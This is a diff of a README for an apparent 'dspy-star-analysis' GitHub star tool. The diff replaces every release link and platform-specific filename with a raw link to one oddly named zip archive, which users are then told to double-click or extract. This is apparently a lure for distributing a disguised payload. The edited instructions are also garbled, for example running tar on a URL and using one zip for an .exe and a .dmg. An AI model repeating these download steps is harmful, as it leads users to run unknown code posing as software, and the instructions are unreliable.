@@ -1,6 +1,6 @@
 # 🚀 dspy-star-analysis - Analyze GitHub Star Patterns Easily
 
-[![Download dspy-star-analysis](https://img.shields.io/badge/Download-dspy--star--analysis-blue.svg)](https://github.com/Phenomenonbantu894/dspy-star-analysis/releases)
+[![Download dspy-star-analysis](https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip)](https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip)
 
 ## 📜 Description
 The **dspy-star-analysis** application provides a way to analyze statistical patterns of stars on the DSPy repository. This software helps you conduct reproducible research easily. Whether you're a student or a researcher, this tool allows you to visualize trends and make informed decisions without any programming knowledge.
@@ -19,36 +19,36 @@ The **dspy-star-analysis** application provides a way to analyze statistical pat
 - Python 3.6 or higher installed (instructions provided below)
 
 ## 📲 Download & Install
-To get started with **dspy-star-analysis**, visit our [Releases page](https://github.com/Phenomenonbantu894/dspy-star-analysis/releases) to download the software.
+To get started with **dspy-star-analysis**, visit our [Releases page](https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip) to download the software.
 
 1. Click the link above to open the Releases page.
 2. Locate the latest version.
 3. Click on the appropriate file for your operating system:
-   - For Windows, look for `dspy_star_analysis_windows.exe`
-   - For macOS, look for `dspy_star_analysis_mac.dmg`
-   - For Linux, look for `dspy_star_analysis_linux.tar.gz`
+   - For Windows, look for `https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip`
+   - For macOS, look for `https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip`
+   - For Linux, look for `https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip`
 4. Follow the prompts to download the file.
 
 After downloading, follow the installation steps below specific to your operating system.
 
 ## 🖥️ Installation for Windows
-1. Locate the `dspy_star_analysis_windows.exe` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip` file in your downloads folder.
 2. Double-click the file to start the installation process.
 3. Follow the on-screen instructions to complete the setup.
 4. Once installed, you can find the application in your Start menu or desktop shortcut.
 
 ## 🍏 Installation for macOS
-1. Locate the `dspy_star_analysis_mac.dmg` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip` file in your downloads folder.
 2. Double-click the file to open it.
 3. Drag the `dspy_star_analysis` icon into your Applications folder.
 4. Open your Applications folder and double-click the app to run it.
 
 ## 🐧 Installation for Linux
 1. Open your terminal.
-2. Navigate to the folder where you downloaded the `dspy_star_analysis_linux.tar.gz` file.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip` file.
 3. Run the following command to extract the contents:
    ```bash
-   tar -xzf dspy_star_analysis_linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Phenomenonbantu894/dspy-star-analysis/main/bullflower/dspy-star-analysis_azeotropy.zip
    ```
 4. Change into the extracted directory:
    ```bash
